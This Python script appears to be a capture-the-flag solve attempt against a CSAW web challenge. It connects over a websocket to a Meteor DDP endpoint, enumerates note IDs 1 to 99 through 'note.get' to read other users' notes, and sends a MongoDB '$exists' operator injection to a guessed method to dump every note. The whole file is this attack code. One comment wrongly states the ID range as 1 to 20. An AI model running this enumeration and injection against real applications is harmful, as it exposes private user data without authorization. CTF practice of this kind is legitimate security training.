#!/usr/bin/env python3
import websocket
import json
import random
import string
import time

def random_id(length=10):
    """Generate a random ID string."""
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def on_message(ws, message):
    print(f"Received: {message}")

    # Parse the response
    response = json.loads(message)

    # Look for specific patterns that might indicate successful notes retrieval
    if "result" in response and isinstance(response.get("result"), dict):
        result = response["result"]
        if "content" in result and "owner" in result:
            print(f"Found note! Owner: {result['owner']}, Content: {result['content']}")

    # Look for arrays of notes
    if "result" in response and isinstance(response.get("result"), list):
        for item in response["result"]:
            if isinstance(item, dict) and "content" in item and "owner" in item:
                print(f"Found note in list! Owner: {item['owner']}, Content: {item['content']}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")

def on_open(ws):
    print("Connection opened")

    # Connect to Meteor DDP
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1", "pre2", "pre1"]
    }
    ws.send(json.dumps(connect_msg))

    # Try all noteIds from 1 to 20
    for note_id in range(1, 100):
        method_id = random_id()
        get_note_msg = {
            "msg": "method",
            "method": "note.get",
            "params": [str(note_id)],
            "id": method_id
        }
        print(f"Trying to get note with ID: {note_id}")
        ws.send(json.dumps(get_note_msg))
        time.sleep(0.1)  # Small delay to avoid flooding

    # Try a method to find all notes
    method_id = random_id()
    find_all_msg = {
        "msg": "method",
        "method": "notes.getById",  # Try likely method names
        "params": [{"_id": {"$exists": True}}],
        "id": method_id
    }
    ws.send(json.dumps(find_all_msg))

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://web.chal.csaw.io:5000/sockjs/websocket",
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)

    ws.run_forever()

